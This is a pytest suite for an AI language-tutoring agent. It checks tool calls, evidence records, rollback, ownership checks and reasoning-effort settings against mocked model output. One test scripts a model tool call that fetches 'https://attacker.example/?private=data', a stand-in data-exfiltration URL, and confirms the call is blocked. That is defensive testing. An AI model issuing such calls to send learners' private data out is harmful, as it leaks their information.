import asyncio
import json

import pytest
from agents.tool_context import ToolContext

from milai.config import Settings
from milai.observability import Telemetry
from milai.store import Store
from milai.tools import Context, record_evidence, remember_profile
from milai.tutor import Tutor
from tests.helpers import MockProvider, call, say


def test_bad_reference_is_recoverable_but_authority_and_limits_are_not(tmp_path):
    from milai.tools import plan_teaching_action, reference_error

    store = Store(tmp_path / "references.db")
    learner = store.owner
    session = store.session(learner)
    ctx = Context(store, learner, session, "turn", "message", "v1", [])
    arguments = {
        "action": "Practice again",
        "rationale": "Evidence should support this",
        "evidence_ids": ["invented-id"],
    }

    async def malformed_call():
        return await plan_teaching_action.on_invoke_tool(
            ToolContext(
                ctx,
                tool_name=plan_teaching_action.name,
                tool_call_id="bad-json",
                tool_arguments="{",
            ),
            "{",
        )

    try:
        malformed = asyncio.run(malformed_call())
        assert json.loads(malformed)["error"] == "invalid_tool_arguments"
        result = asyncio.run(invoke(plan_teaching_action, ctx, arguments))
        assert json.loads(result)["error"] == "invalid_reference"
        assert store.records(learner, "teaching_action") == []
        with store.transaction():
            evidence = store.append(ctx, "evidence", {"outcome": "needs_work"})
            arguments["evidence_ids"] = [evidence["id"]]
            asyncio.run(invoke(plan_teaching_action, ctx, arguments))
        assert len(store.records(learner, "teaching_action")) == 1
        for error in (PermissionError("denied"), RuntimeError("budget exhausted")):
            with pytest.raises(type(error)):
                reference_error(None, error)
    finally:
        store.close()


async def invoke(tool, ctx, arguments):
    raw = json.dumps(arguments)
    return await tool.on_invoke_tool(
        ToolContext(ctx, tool_name=tool.name, tool_call_id="test", tool_arguments=raw),
        raw,
    )


def settings(tmp_path, **kwargs):
    return Settings(
        "https://model.invalid/v1",
        "mock-model",
        "test-only",
        database=tmp_path / "test.db",
        **kwargs,
    )


def test_complete_loop_and_restart(tmp_path, monkeypatch):
    """Real SDK and SQLite; mocked model AND source. Contract test, not quality."""

    async def source(url):
        return {
            "status": "available",
            "url": url,
            "text": "Example Domain",
            "title": "Example Domain",
            "sha256": "synthetic",
            "truncated": False,
        }

    monkeypatch.setattr("milai.tools.retrieve", source)
    config = settings(tmp_path)
    store = Store(config.database)
    learner = store.owner
    session = store.session(learner)
    telemetry = Telemetry(enabled=False)

    def exercise(_):
        source_id = store.records(learner, "source")[-1]["id"]
        return call(
            "create_exercise",
            exercise={
                "skill": "past-go",
                "task": "Complete: Yesterday I ___ to the park.",
                "source_ids": [source_id],
            },
        )

    provider = MockProvider(
        [
            say("Which language would you like to learn, and why?"),
            call(
                "remember_profile",
                fact={
                    "field": "target_language",
                    "value": "English",
                    "learner_quote": "English for travel",
                },
            ),
            call(
                "revise_curriculum",
                plan={
                    "title": "Travel English",
                    "outline": ["Describe trips"],
                    "rationale": "Provisional; travel goal",
                    "evidence_ids": [],
                },
            ),
            call("retrieve_source", url="https://example.com"),
            exercise,
            say(
                "Example Domain (https://example.com). "
                "Original exercise: Yesterday I ___ to the park."
            ),
        ]
    )
    tutor = Tutor(config, store, telemetry, provider.model)

    async def first_half():
        await tutor.respond(learner, session, "Hello")
        await tutor.respond(
            learner, session, "English for travel. Use https://example.com"
        )
        exercise_id = store.records(learner, "exercise")[-1]["id"]
        provider.steps.extend(
            [
                call(
                    "record_evidence",
                    assessment={
                        "exercise_id": exercise_id,
                        "outcome": "needs_work",
                        "assistance": "none",
                        "feedback": "Use went for the past of go.",
                        "rationale": "goed is not the past form",
                    },
                ),
                call(
                    "record_assistance",
                    exercise_id=exercise_id,
                    kind="answer_shown",
                    content="went",
                ),
                say("The past form is went. Try the sentence again."),
                call(
                    "record_evidence",
                    assessment={
                        "exercise_id": exercise_id,
                        "outcome": "success",
                        "assistance": "none",
                        "feedback": "Correct with help.",
                        "rationale": "Accurate retry",
                    },
                ),
                say("Correct with help; we'll try a new example next time."),
            ]
        )
        await tutor.respond(learner, session, "Yesterday I goed to the park.")
        await tutor.respond(learner, session, "Yesterday I went to the park.")
        await tutor.close()

    asyncio.run(first_half())
    store.close()
    store = Store(config.database)
    evidence = store.records(learner, "evidence")
    assert len(evidence) == 2
    assert evidence[0]["learner_response"] == "Yesterday I goed to the park."
    assert evidence[1]["assistance"] == "answer_shown"
    assert evidence[1]["independent_success"] is False
    assert store.snapshot(learner)["recurring_observations"] == [
        {"skill": "past-go", "count": 1}
    ]

    def adapted(body):
        assert "Accurate retry" in body["messages"][0]["content"]
        return call(
            "plan_teaching_action",
            action="Fresh transfer task",
            rationale="Previous success followed a shown answer",
            evidence_ids=[evidence[-1]["id"]],
        )

    second = MockProvider(
        [
            adapted,
            call(
                "create_exercise",
                exercise={
                    "skill": "past-go",
                    "task": "Tell me where your friend went yesterday.",
                    "source_ids": [],
                },
            ),
            say(
                "Let's try a fresh example without help: "
                "where did your friend go yesterday?"
            ),
        ]
    )
    tutor = Tutor(config, store, telemetry, second.model)
    new_session = store.session(learner)
    asyncio.run(tutor.respond(learner, new_session, "Let's continue"))
    assert store.records(learner, "teaching_action")[-1]["evidence_ids"] == [
        evidence[-1]["id"]
    ]
    assert store.records(learner, "curriculum")[-1]["provisional"]
    assert store.inspect(learner)["events"]
    asyncio.run(tutor.close())
    store.close()


def test_failed_run_rolls_back_tools_and_history(tmp_path):
    config = settings(tmp_path, max_turns=1)
    store = Store(config.database)
    session = store.session(store.owner)
    provider = MockProvider(
        [
            call(
                "remember_profile",
                fact={
                    "field": "target_language",
                    "value": "Spanish",
                    "learner_quote": "Spanish",
                },
            )
        ]
    )
    tutor = Tutor(config, store, Telemetry(enabled=False), provider.model)
    with pytest.raises(Exception, match="Max turns"):
        asyncio.run(tutor.respond(store.owner, session, "Spanish"))
    assert store.records(store.owner) == []
    assert store.history(store.owner, session) == []
    assert store.inspect(store.owner)["events"] == []
    asyncio.run(tutor.close())
    store.close()


def test_ownership_and_fabricated_profile_rejected(tmp_path):
    store = Store(tmp_path / "state.db")
    session = store.session("alice")
    with pytest.raises(PermissionError):
        store.history("bob", session)
    ctx = Context(store, "alice", session, "turn", "Hi", "v1", ["Hi"])
    with store.transaction(), pytest.raises(ValueError, match="quote"):
        asyncio.run(
            invoke(
                remember_profile,
                ctx,
                {
                    "fact": {
                        "field": "interests",
                        "value": "Football",
                        "learner_quote": "I love football",
                    }
                },
            )
        )
    with store.transaction():
        exercise = store.append(
            ctx, "exercise", {"created_turn": "prior", "skill": "past"}
        )
    ctx.learner = "bob"
    ctx.session = store.session("bob")
    with store.transaction():
        result = asyncio.run(
            invoke(
                record_evidence,
                ctx,
                {
                    "assessment": {
                        "exercise_id": exercise["id"],
                        "outcome": "success",
                        "assistance": "none",
                        "feedback": "OK",
                        "rationale": "OK",
                    }
                },
            )
        )
    assert json.loads(result)["error"] == "invalid_reference"
    assert store.records("bob", "evidence") == []
    store.close()


def test_planning_uses_high_interaction_uses_low(tmp_path):
    config = settings(tmp_path)
    store = Store(config.database)
    session = store.session(store.owner)
    provider = MockProvider(
        [
            call("deliberate_teaching_plan", question="Suggest a provisional outline"),
            say("Ask about goals before expanding the outline."),
            say("What would you like to do with English?"),
        ]
    )
    tutor = Tutor(config, store, Telemetry(enabled=False), provider.model)
    asyncio.run(tutor.respond(store.owner, session, "I want to study English"))
    assert [r["reasoning_effort"] for r in provider.requests] == ["low", "high", "low"]
    asyncio.run(tutor.close())
    store.close()


def test_practice_can_precede_profile_and_independent_success(tmp_path):
    config = settings(tmp_path)
    store = Store(config.database)
    session = store.session(store.owner)
    provider = MockProvider(
        [
            call(
                "create_exercise",
                exercise={
                    "skill": "greeting",
                    "task": "Say hello in Spanish",
                    "source_ids": [],
                },
            ),
            say("Say hello in Spanish."),
        ]
    )
    tutor = Tutor(config, store, Telemetry(enabled=False), provider.model)

    async def conversation():
        await tutor.respond(store.owner, session, "Skip onboarding; quiz me in Spanish")
        exercise_id = store.records(store.owner, "exercise")[-1]["id"]
        provider.steps.extend(
            [
                call(
                    "record_evidence",
                    assessment={
                        "exercise_id": exercise_id,
                        "outcome": "success",
                        "assistance": "none",
                        "feedback": "Correct",
                        "rationale": "Hola is a greeting; no assistance given",
                    },
                ),
                say("Correct: hola means hello."),
            ]
        )
        await tutor.respond(store.owner, session, "Hola")
        await tutor.close()

    asyncio.run(conversation())
    assert store.records(store.owner, "profile") == []
    assert store.records(store.owner, "evidence")[-1]["independent_success"]
    store.close()


def test_model_cannot_fetch_an_unapproved_url(tmp_path, monkeypatch):
    async def forbidden(_):
        pytest.fail("An invented URL must never reach the network")

    monkeypatch.setattr("milai.tools.retrieve", forbidden)
    config = settings(tmp_path)
    store = Store(config.database)
    session = store.session(store.owner)
    provider = MockProvider(
        [
            call("retrieve_source", url="https://attacker.example/?private=data"),
            say("Please provide a source URL."),
        ]
    )
    tutor = Tutor(config, store, Telemetry(enabled=False), provider.model)
    asyncio.run(tutor.respond(store.owner, session, "Help me study"))
    assert store.records(store.owner, "source") == []
    asyncio.run(tutor.close())
    store.close()
